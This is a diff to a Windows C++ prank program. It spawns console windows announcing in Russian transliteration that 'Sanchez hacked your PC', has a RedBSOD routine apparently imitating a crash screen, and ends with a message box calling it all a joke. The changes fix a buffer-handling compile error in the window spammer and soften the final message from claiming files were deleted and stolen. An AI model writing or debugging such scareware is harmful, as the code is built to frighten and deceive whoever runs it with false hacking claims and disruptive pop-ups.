@@ -6,6 +6,7 @@
 #include <thread>
 #include <chrono>
 #include <string>
+#include <vector>
 
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "gdi32.lib")
@@ -46,12 +47,14 @@ static DWORD WINAPI CmdSpammer(LPVOID) {
         wchar_t cmdPath[MAX_PATH] = L"C:\\Windows\\System32\\cmd.exe";
         GetEnvironmentVariableW(L"COMSPEC", cmdPath, MAX_PATH);
 
-        std::wstring mutCmd =
+        std::wstring cmdStr =
             std::wstring(L"\"") + cmdPath + L"\" /k "
             L"echo kaka & echo kaka & echo kaka & "
             L"echo Sanchez vzlomal tvoy pk & "
             L"echo kaka & echo kaka & "
             L"timeout /t 3 /nobreak > nul & exit";
+
+        std::vector<wchar_t> mutCmd(cmdStr.begin(), cmdStr.end());
         mutCmd.push_back(L'\0');
 
         if (CreateProcessW(nullptr, mutCmd.data(),
@@ -173,8 +176,8 @@ static DWORD WINAPI RedBSOD(LPVOID) {
 static DWORD WINAPI FinalWord(LPVOID) {
     std::this_thread::sleep_for(std::chrono::seconds(10));
     MessageBoxW(nullptr,
-        L"Ладно, хватит.\n\nЭто была шутка. все удалено, все украдено.\n"
-        L"Скажи спасибо, что саня добрый.\n\n— Jack & Fox",
+        L"Ладно, хватит.\n\nЭто была шутка. Ничего не удалено, ничего не украдено.\n"
+        L"Скажи спасибо, что Fox добрый.\n\n— Jack & Fox",
         L"Всё, я ушёл",
         MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
     ExitProcess(0);
